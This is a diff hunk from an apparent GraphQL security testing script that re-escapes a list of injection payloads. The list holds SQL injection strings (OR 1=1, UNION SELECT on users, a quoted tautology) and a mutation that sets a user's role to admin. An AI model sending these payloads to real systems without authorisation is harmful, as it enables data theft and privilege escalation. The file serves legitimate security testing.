@@ -17,10 +17,10 @@ INTROSPECTION_QUERIES = [
 ]
 
 INJECTION_PAYLOADS = [
-    '{"query":"{user(id:\\"1 OR 1=1\\"){id,name,email}}"}',
-    '{"query":"{user(id:\\"1\\' UNION SELECT * FROM users--\\"){id}}"}',
-    '{"query":"mutation{updateUser(id:\\"1\\",role:\\"admin\\"){id,role}}"}',
-    '{"query":"{users(filter:{name_contains:\\"\\' OR \\'1\\'=\\'1\\"}){id,name}}"}',
+    "{\"query\":\"{user(id:\\\\\\\"1 OR 1=1\\\\\\\"){id,name,email}}\"}",
+    "{\"query\":\"{user(id:\\\\\\\"1\\\\\\' UNION SELECT * FROM users--\\\\\\\"){id}}\"}",
+    "{\"query\":\"mutation{updateUser(id:\\\\\\\"1\\\\\\\",role:\\\\\\\"admin\\\\\\\"){id,role}}\"}",
+    "{\"query\":\"{users(filter:{name_contains:\\\\\\\"\\\\\\' OR \\\\\\'1\\\\\\'=\\\\\\'1\\\\\\\"}){id,name}}\"}",
 ]
 
 BATCH_ABUSE_PAYLOADS = [
